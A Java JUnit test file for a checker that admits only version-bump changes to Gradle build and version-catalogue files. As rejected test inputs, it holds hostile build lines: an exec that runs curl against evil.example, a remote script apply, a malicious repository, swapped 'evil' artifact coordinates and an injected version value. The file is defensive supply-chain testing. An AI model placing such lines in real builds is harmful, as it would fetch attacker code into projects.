package com.simonrowe.factory.git;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assertions.assertTimeoutPreemptively;

import com.simonrowe.factory.git.DependencyPins.FileDiff;
import com.simonrowe.factory.git.DependencyPins.Verdict;
import java.time.Duration;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class DependencyPinsTest {

  private static final String ROOT_BUILD = """
      plugins {
          java
      }

      subprojects {
          // BOM overrides. They MUST be ext[...] property overrides.
          ext["tomcat.version"] = "11.0.25"
          ext["jackson-2-bom.version"] = "2.21.7"
      }
      """;

  private static final String BACKEND_BUILD = """
      dependencies {
          constraints {
              // GHSA-6fmv-xxpf-w3cw
              implementation("org.codehaus.plexus:plexus-utils:3.6.1")
          }

          implementation(libs.spring.boot.starter.webmvc)
          implementation("org.example:url-in-string:1.0.0") // "https://x/{"
      }
      """;

  private static FileDiff modified(final String path, final String patch) {
    return new FileDiff(path, null, "modified", patch);
  }

  private static Verdict check(final FileDiff... files) {
    Map<String, String> heads =
        Map.of("build.gradle.kts", ROOT_BUILD, "backend/build.gradle.kts", BACKEND_BUILD);
    return DependencyPins.check(List.of(files), heads::get);
  }

  @Test
  void catalogueVersionChangeIsVersionsOnly() {
    Verdict verdict = check(modified("gradle/libs.versions.toml", """
        @@ -21,3 +21,3 @@ googleHttpClient = "1.47.0"
         temporal = "1.36.0"
        -bouncycastle = "1.85"
        +bouncycastle = "1.86"
        """));

    assertThat(verdict.versionsOnly()).as(verdict.reason()).isTrue();
  }

  @Test
  void inlineLibraryVersionChangeIsVersionsOnly() {
    assertThat(check(modified("gradle/libs.versions.toml", """
        @@ -40,1 +40,1 @@
        -testcontainers-bom = { module = "org.testcontainers:bom", version = "2.0.5" }
        +testcontainers-bom = { module = "org.testcontainers:bom", version = "2.0.6" }
        """)).versionsOnly()).isTrue();
  }

  @Test
  void overrideChangeWithCommentIsVersionsOnly() {
    Verdict verdict = check(modified("build.gradle.kts", """
        @@ -6,3 +6,4 @@ subprojects {
             // BOM overrides. They MUST be ext[...] property overrides.
        -    ext["tomcat.version"] = "11.0.25"\s
        +    // CVE-2026-1234: Tomcat request smuggling
        +    ext["tomcat.version"] = "11.0.26"
             ext["jackson-2-bom.version"] = "2.21.7"
        """));

    assertThat(verdict.versionsOnly()).as(verdict.reason()).isTrue();
  }

  @Test
  void constraintVersionChangeIsVersionsOnly() {
    assertThat(check(modified("backend/build.gradle.kts", """
        @@ -3,2 +3,2 @@ dependencies {
                 // GHSA-6fmv-xxpf-w3cw
        -        implementation("org.codehaus.plexus:plexus-utils:3.6.1")
        +        implementation("org.codehaus.plexus:plexus-utils:3.6.2")
        """)).versionsOnly()).isTrue();
  }

  @Test
  void newConstraintInsideTheConstraintsBlockIsVersionsOnly() {
    String plexus = "plexus-utils:3.6.1\")\n";
    String netty = "        implementation(\"io.netty:netty-codec-http:4.1.118.Final\")\n";
    String head = BACKEND_BUILD.replace(plexus, plexus + netty);
    Verdict verdict = DependencyPins.check(List.of(modified("backend/build.gradle.kts", """
        @@ -4,2 +4,3 @@ dependencies {
                 implementation("org.codehaus.plexus:plexus-utils:3.6.1")
        +        implementation("io.netty:netty-codec-http:4.1.118.Final")
             }
        """)), path -> head);

    assertThat(verdict.versionsOnly()).as(verdict.reason()).isTrue();
  }

  /** The case the head-file check exists for: a coordinate in dependencies adds a library. */
  @Test
  void newCoordinateOutsideConstraintsIsRefused() {
    String webmvc = "implementation(libs.spring.boot.starter.webmvc)\n";
    String evil = "        implementation(\"evil:payload:1.0.0\")\n";
    String head = BACKEND_BUILD.replace(webmvc, webmvc + evil);
    Verdict verdict = DependencyPins.check(List.of(modified("backend/build.gradle.kts", """
        @@ -7,1 +7,2 @@ dependencies {
                 implementation(libs.spring.boot.starter.webmvc)
        +        implementation("evil:payload:1.0.0")
        """)), path -> head);

    assertThat(verdict.versionsOnly()).isFalse();
    assertThat(verdict.reason()).contains("outside a `constraints {}` block");
  }

  @Test
  void newConstraintIsRefusedWhenTheHeadFileCannotBeRead() {
    assertThat(DependencyPins.check(List.of(modified("backend/build.gradle.kts", """
        @@ -4,1 +4,2 @@
                 implementation("org.codehaus.plexus:plexus-utils:3.6.1")
        +        implementation("io.netty:netty-codec-http:4.1.118.Final")
        """)), path -> null).versionsOnly()).isFalse();
  }

  @Test
  void coordinateChangeIsNotVersionChange() {
    Verdict verdict = check(modified("backend/build.gradle.kts", """
        @@ -4,1 +4,1 @@
        -        implementation("org.codehaus.plexus:plexus-utils:3.6.1")
        +        implementation("org.codehaus.evil:plexus-utils:3.6.1")
        """));

    assertThat(verdict.versionsOnly()).isFalse();
    assertThat(verdict.reason()).contains("removes a pinned version");
  }

  @Test
  void catalogueModuleChangeIsRefused() {
    assertThat(check(modified("gradle/libs.versions.toml", """
        @@ -40,1 +40,1 @@
        -pdfbox = { module = "org.apache.pdfbox:pdfbox", version.ref = "pdfbox" }
        +pdfbox = { module = "org.evil:pdfbox", version.ref = "pdfbox" }
        """)).versionsOnly()).isFalse();
  }

  @Test
  void catalogueShortFormCoordinateIsRefused() {
    assertThat(check(modified("gradle/libs.versions.toml", """
        @@ -40,0 +40,1 @@
        +evil = "org.evil:payload:1.0.0"
        """)).versionsOnly()).isFalse();
  }

  @Test
  void anyScriptLineIsRefused() {
    for (String line : List.of(
        "    repositories { maven(\"https://evil.example\") }",
        "    exec { commandLine(\"curl\", \"https://evil.example\") }",
        "    apply(from = \"https://evil.example/x.gradle.kts\")",
        "    id(\"org.evil.plugin\") version \"1.0.0\"",
        "    /* ext[\"tomcat.version\"] = \"11.0.25\"")) {
      Verdict verdict = check(modified("build.gradle.kts", """
          @@ -6,1 +6,2 @@ subprojects {
               // BOM overrides. They MUST be ext[...] property overrides.
          +%s
          """.formatted(line)));
      assertThat(verdict.versionsOnly()).as(line).isFalse();
    }
  }

  @Test
  void versionMustLookLikeVersion() {
    for (String value : List.of("latest.release", "+", "1", "${evil}", "11.0.25\" + \"x")) {
      Verdict verdict = check(modified("build.gradle.kts", """
          @@ -7,1 +7,1 @@
          -    ext["tomcat.version"] = "11.0.25"\s
          +    ext["tomcat.version"] = "%s"
          """.formatted(value)));
      assertThat(verdict.versionsOnly()).as(value).isFalse();
    }
  }

  @Test
  void removingPinIsRefused() {
    assertThat(check(modified("build.gradle.kts", """
        @@ -7,2 +7,1 @@
        -    ext["tomcat.version"] = "11.0.25"
             ext["jackson-2-bom.version"] = "2.21.7"
        """)).versionsOnly()).isFalse();
  }

  @Test
  void otherFilesStatusesAndMissingPatchesAreRefused() {
    String patch = """
        @@ -1,1 +1,1 @@
        -bouncycastle = "1.85"
        +bouncycastle = "1.86"
        """;
    assertThat(check(modified("software-factory/build.gradle.kts", patch)).versionsOnly())
        .isFalse();
    assertThat(check(new FileDiff("gradle/libs.versions.toml", null, "added", patch))
        .versionsOnly()).isFalse();
    assertThat(check(new FileDiff("gradle/libs.versions.toml", "gradle/old.toml", "renamed",
        patch)).versionsOnly()).isFalse();
    assertThat(check(modified("gradle/libs.versions.toml", null)).versionsOnly()).isFalse();
    assertThat(check(modified("gradle/libs.versions.toml", "not a patch")).versionsOnly())
        .isFalse();
    assertThat(DependencyPins.check(List.of(), path -> null).versionsOnly()).isFalse();
  }

  @Test
  void everyFileMustQualify() {
    assertThat(check(
        modified("gradle/libs.versions.toml", """
            @@ -1,1 +1,1 @@
            -bouncycastle = "1.85"
            +bouncycastle = "1.86"
            """),
        modified("build.gradle.kts", """
            @@ -1,0 +1,1 @@
            +tasks.register("evil") { }
            """)).versionsOnly()).isFalse();
  }

  @Test
  void scannerSkipsBracesInStringsAndComments() {
    String content = """
        dependencies {
            implementation("x:y:1.0.0") // "{"
            val s = "}}}"
            /* } */
            constraints {
                implementation("a:b:1.0.0")
            }
            val raw = \"""
              constraints {
              x
            \"""
        }
        """;
    assertThat(DependencyPins.directlyInside(content, 6, "constraints")).isTrue();
    assertThat(DependencyPins.directlyInside(content, 2, "constraints")).isFalse();
    assertThat(DependencyPins.directlyInside(content, 10, "constraints")).isFalse();
    assertThat(DependencyPins.directlyInside(content, 1, "constraints")).isFalse();
    assertThat(DependencyPins.directlyInside(content, 999, "constraints")).isFalse();
  }

  /** Worst-case shapes for every pattern; possessive quantifiers keep each match linear. */
  @Test
  void adversarialLongLinesAreRefusedQuickly() {
    String longValue = "1." + "0".repeat(100_000);
    String nearMiss = "    ext[\"" + "a".repeat(100_000) + "\"] = \"1.0";
    String spaces = " ".repeat(100_000) + "x";
    assertTimeoutPreemptively(Duration.ofSeconds(2), () -> {
      for (String line : List.of(longValue, nearMiss, spaces, "\"" + longValue + "\"")) {
        assertThat(check(modified("build.gradle.kts", """
            @@ -1,0 +1,1 @@
            +%s
            """.formatted(line))).versionsOnly()).isFalse();
        assertThat(check(modified("gradle/libs.versions.toml", """
            @@ -1,0 +1,1 @@
            +%s
            """.formatted(line))).versionsOnly()).isFalse();
        assertThat(DependencyPins.mask(line)).isNotNull();
      }
      assertThat(check(modified("build.gradle.kts", "@@ -1 +1 @@" + "x".repeat(100_000)))
          .versionsOnly()).isFalse();
    });
  }
}
